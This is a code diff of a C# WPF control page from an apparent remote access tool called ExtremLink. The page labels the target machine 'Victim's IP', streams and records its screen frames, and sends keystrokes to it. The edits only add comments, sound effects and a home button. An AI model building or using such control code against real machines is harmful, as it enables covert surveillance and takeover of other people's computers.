@@ -28,13 +28,13 @@ namespace ExtremLink_Client_v2.Pages
 
         // Attirbutes:
         private ContentControl contentMain;
-
         private IList<AttackerSession> sessions;
         private Thread recordingThread;
-
         private bool isReceivingFrames;
         private bool isRecordingFrame;
 
+
+        // Constructor:
         public ControlPage(ContentControl contentMain)
         {
             this.sessions = new List<AttackerSession>();
@@ -45,24 +45,29 @@ namespace ExtremLink_Client_v2.Pages
             clientIpTextBlock.Text = $"Victim's IP: {Attacker.AttackerInstance.VictimIpAddr}";
         }
 
+
+        // Main buttons:
         private void PlayBtn_Click(object sender, RoutedEventArgs e)
         {
             Attacker.AttackerInstance.SendTCPMessageToClient("&", "StartSendFrames");
             this.isReceivingFrames = true;
             Thread.Sleep(3000);
             this.UpdateFrame();
+            SoundManager.SoundManagerInstance.PlaySound(EPlaylist.Controlling);
         }
         private void PauseBtn_Click(object sender, RoutedEventArgs e)
         {
             Attacker.AttackerInstance.SendTCPMessageToClient("&", "PauseSendFrames");
             this.isReceivingFrames = false;
             this.LoadDefaultFrame();
+            SoundManager.SoundManagerInstance.PlaySound(EPlaylist.Background);
         }
         private void StopBtn_Click(object sender, RoutedEventArgs e)
         {
             Attacker.AttackerInstance.SendTCPMessageToClient("&", "StopSendFrames");
             this.isReceivingFrames = false;
             this.LoadDefaultFrame();
+            SoundManager.SoundManagerInstance.PlaySound(EPlaylist.Background);
         }
         private void RecordBtn_Click(object sender, RoutedEventArgs e)
         {
@@ -78,9 +83,15 @@ namespace ExtremLink_Client_v2.Pages
                 this.isRecordingFrame = false;
             }
         }
+        private void BackHomeBtn_Click(object sender, RoutedEventArgs e)
+        {
+            // A function which changes the current page to the home page.
+            SoundManager.SoundManagerInstance.PlaySound(EPlaylist.Background);
+            this.contentMain.Content = new HomePage(this.contentMain);
+        }
 
 
-        // Frames functions:
+        // Frames & Recording functions:
         private BitmapImage LoadFrameFromFile()
         {
             try
@@ -134,14 +145,12 @@ namespace ExtremLink_Client_v2.Pages
                 }
             }
         }
-
         private void LoadDefaultFrame()
         {
             // Input: Nothing.
             // Output: The function loads the defualt non frame image.
             Dispatcher.InvokeAsync(() => frameImg.Source = new BitmapImage(new Uri("\\Images\\default_image.png", UriKind.RelativeOrAbsolute)));
         }
-
         private async void Record()
         {
             // Input: Nothing.
@@ -189,6 +198,7 @@ namespace ExtremLink_Client_v2.Pages
             }
         }
 
+
         // Keyboard functions:
         private void FrameImg_KeyboardKeyDown(object sender, KeyEventArgs e)
         {
@@ -196,6 +206,6 @@ namespace ExtremLink_Client_v2.Pages
             // Output: The function getting keyboard key and sending it to the client
             Key pressedKey = e.Key;
             CustomKeyboardAttacker.CustomKeyboardInstance.SendKeyboardCommands(pressedKey);
-        }
+        }   
     }
 }
